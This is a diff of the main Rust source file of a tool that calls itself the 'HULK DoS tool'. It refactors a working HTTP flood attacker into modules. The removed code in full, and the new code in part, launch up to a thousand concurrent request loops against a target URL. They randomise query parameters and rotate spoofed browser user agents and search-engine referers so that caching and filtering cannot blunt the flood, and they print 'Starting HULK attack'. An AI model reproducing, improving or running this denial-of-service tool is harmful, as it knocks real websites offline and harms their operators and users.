@@ -1,191 +1,119 @@
+mod cli;
+mod config;
+mod error;
+mod query;
+mod report;
+mod stats;
+mod ua;
+mod worker;
+
+use std::process::ExitCode;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+
 use clap::Parser;
-use futures::future::join_all;
-use hyper::body::HttpBody as _;
-use hyper::{Body, Client, Request};
-use hyper_tls::HttpsConnector;
-use rand::distributions::Alphanumeric;
-use rand::{thread_rng, Rng};
-use std::sync::atomic::{AtomicUsize, Ordering};
-use std::{
-    fs::File,
-    io,
-    io::{prelude::*, BufReader, Write},
-    path::Path,
-};
 
-static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
-static ERR_COUNT: AtomicUsize = AtomicUsize::new(0);
-static FAIL_COUNT: AtomicUsize = AtomicUsize::new(0);
-static USER_AGENTS: &[&str] = &[
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
-    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
-    ];
-static REFERERS: &[&str] = &[
-    "https://www.google.com/?q=",
-    "https://bing.com/search?q=",
-    "https://yandex.ru/yandsearch?text=",
-];
-
-#[derive(Parser, Debug)]
-#[clap(author = "Hexalyse", about = "HULK DoS tool")]
-struct CliArguments {
-    /// Maximum number of concurrent connections to the target
-    #[clap(short, default_value = "1000")]
-    max_connections: usize,
-    /// Target URL (eg. http://example.com)
-    target: String,
-    /// verbose mode (display HTTP error codes)
-    #[clap(short, long, takes_value = false, required = false)]
-    verbose: bool,
-    /// File containing a list of user agents to use
-    #[clap(short, takes_value = true, required = false)]
-    user_agents_file: Option<String>,
-    /// Name of a GET parameter to add to the request (the value will be fuzzed, instead of fuzzing both the name of a GET parameter and its value)
-    #[clap(short, takes_value = true, required = false)]
-    parameter_name: Option<String>,
-    /// File containing a list of Referers to use (a random string will be appended to each Referer)
-    #[clap(short, takes_value = true, required = false)]
-    referers_file: Option<String>,
-}
-
-fn lines_from_file(filename: impl AsRef<Path> + std::marker::Copy) -> Vec<String> {
-    let file = File::open(filename)
-        .unwrap_or_else(|_| panic!("No such file: {}", filename.as_ref().display()));
-    let buf = BufReader::new(file);
-    buf.lines()
-        .map(|l| l.expect("Could not parse line"))
-        .filter(|x| !x.is_empty())
-        .collect()
-}
-
-fn random_string(n: usize) -> String {
-    thread_rng()
-        .sample_iter(&Alphanumeric)
-        .take(n)
-        .map(char::from)
-        .collect()
-}
+use cli::CliArguments;
+use config::AppConfig;
+use error::AppError;
+use stats::Stats;
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let args = CliArguments::parse();
-    let user_agents = if let Some(user_agents_file) = args.user_agents_file {
-        lines_from_file(user_agents_file.as_str())
-    } else {
-        USER_AGENTS.iter().map(|x| x.to_string()).collect()
-    };
-    let referers = if let Some(referers_file) = args.referers_file {
-        lines_from_file(referers_file.as_str())
-    } else {
-        REFERERS.iter().map(|x| x.to_string()).collect()
-    };
-    println!("[*] Starting HULK attack on {}", args.target);
-    let tasks = (0..args.max_connections).map(|_| {
-        // clone the arguments to pass to the task since we are move-ing them to the task
-        let target = args.target.clone();
-        let parameter_name = args.parameter_name.clone();
-        let user_agents = user_agents.clone();
-        let referers = referers.clone();
-        tokio::spawn(async move {
-            fetch_url(target, args.verbose, parameter_name, user_agents, referers).await
-        })
-    });
-    join_all(tasks).await;
-    Ok(())
+async fn main() -> ExitCode {
+    match run().await {
+        Ok(()) => ExitCode::SUCCESS,
+        Err(err) => {
+            eprintln!("[!] {err}");
+            ExitCode::FAILURE
+        }
+    }
 }
 
-async fn fetch_url(
-    target: String,
-    verbose: bool,
-    parameter_name: Option<String>,
-    user_agents: Vec<String>,
-    referers: Vec<String>,
-) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let https = HttpsConnector::new();
-    let client = Client::builder().build::<_, hyper::Body>(https);
-    let user_agents_len = user_agents.len();
-    let referers_len = referers.len();
+async fn run() -> Result<(), AppError> {
+    let args = CliArguments::parse();
+    let config = Arc::new(AppConfig::from_cli(args)?);
+    let stats = Stats::new();
+    let shutdown = Arc::new(AtomicBool::new(false));
+
+    println!(
+        "[*] Starting HULK attack on {} ({} workers)",
+        config.target, config.max_connections
+    );
+    if !config.query.fuzz.is_empty() {
+        let names: Vec<&str> = config.query.fuzz.iter().map(|p| p.name.as_str()).collect();
+        println!("[*] Fuzzing query params: {}", names.join(", "));
+    }
+
+    let mut join_set = tokio::task::JoinSet::new();
+    for _ in 0..config.max_connections {
+        join_set.spawn(worker::run(
+            Arc::clone(&config),
+            Arc::clone(&stats),
+            Arc::clone(&shutdown),
+        ));
+    }
+
+    let reporter = tokio::spawn(report::run_live(Arc::clone(&stats), Arc::clone(&shutdown)));
+
+    let mut panics = 0usize;
+    let interrupt = wait_for_interrupt();
+    tokio::pin!(interrupt);
     loop {
-        let uri = if target.contains('?') {
-            format!(
-                "{}&{}={}",
-                target,
-                parameter_name
-                    .as_deref()
-                    .unwrap_or(random_string(10).as_str()),
-                random_string(10)
-            )
-        } else {
-            format!(
-                "{}?{}={}",
-                target,
-                parameter_name
-                    .as_deref()
-                    .unwrap_or(random_string(10).as_str()),
-                random_string(10)
-            )
-        };
-        let referer = format!(
-            "{}{}",
-            referers[thread_rng().gen_range(0..referers_len)],
-            random_string(thread_rng().gen_range(5..10))
-        );
-        // I need to clone this, otherwise I get borrowing issues.
-        // I'm new to Rust and there might be a cleaner way to do this. Feel free to submit a PR.
-        let user_agent = user_agents[thread_rng().gen_range(0..user_agents_len)].clone();
-
-        let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed);
-        let request = Request::get(uri)
-            .header("User-Agent", user_agent)
-            .header("Referer", referer)
-            .body(Body::empty())
-            .unwrap();
-        let resp = client.request(request).await;
-        // Do not return on error, to allow keeping the max number of tasks running
-        let mut resp = match resp {
-            Ok(resp) => resp,
-            Err(_) => {
-                FAIL_COUNT.fetch_add(1, Ordering::Relaxed);
-                continue;
+        tokio::select! {
+            _ = &mut interrupt => {
+                println!("\n[*] Ctrl+C received, stopping workers...");
+                break;
             }
-        };
-        if resp.status().as_u16() >= 400 {
-            if verbose {
-                println!("\n[!] Error: {}", resp.status());
+            result = join_set.join_next() => {
+                match result {
+                    None => break,
+                    Some(Err(err)) if err.is_panic() => {
+                        panics += 1;
+                        println!("\n[!] Worker task panicked, stopping...");
+                        break;
+                    }
+                    Some(_) => {}
+                }
             }
-            ERR_COUNT.fetch_add(1, Ordering::Relaxed);
         }
-        if total_reqs % 10 == 0 {
-            let err_count = ERR_COUNT.load(Ordering::Relaxed);
-            let fail_count = FAIL_COUNT.load(Ordering::Relaxed);
-            let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed);
-            // sometimes the error count is higher than total requests (I don't get it, it also happens with SeqCst ordering)
-            // so we need to check for that not to get a substract with overflow
-            let ok_count = if total_reqs >= err_count + fail_count {
-                total_reqs - (err_count + fail_count)
-            } else {
-                0
-            };
-            print!(
-                "\r[*] {} requests | {} OK | {} server errors | {} failed requests",
-                total_reqs,
-                ok_count,
-                err_count,
-                fail_count
-            );
-            io::stdout().flush().ok();
-        }
+    }
 
-        resp.body_mut().data().await;
+    shutdown.store(true, Ordering::SeqCst);
+    join_set.abort_all();
+    panics += drain_workers(&mut join_set).await;
+    reporter.abort();
+    let _ = reporter.await;
+    report::print_final(&stats);
+
+    if panics > 0 {
+        Err(AppError::WorkerPanics(panics))
+    } else {
+        Ok(())
+    }
+}
+
+async fn drain_workers(join_set: &mut tokio::task::JoinSet<()>) -> usize {
+    let mut panics = 0usize;
+    while let Some(result) = join_set.join_next().await {
+        if matches!(result, Err(err) if err.is_panic()) {
+            panics += 1;
+        }
+    }
+    panics
+}
+
+async fn wait_for_interrupt() {
+    #[cfg(windows)]
+    {
+        let mut ctrl_c = tokio::signal::windows::ctrl_c().expect("listen for Ctrl+C");
+        let mut ctrl_break = tokio::signal::windows::ctrl_break().expect("listen for Ctrl+Break");
+        tokio::select! {
+            _ = ctrl_c.recv() => {}
+            _ = ctrl_break.recv() => {}
+        }
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = tokio::signal::ctrl_c().await;
     }
 }
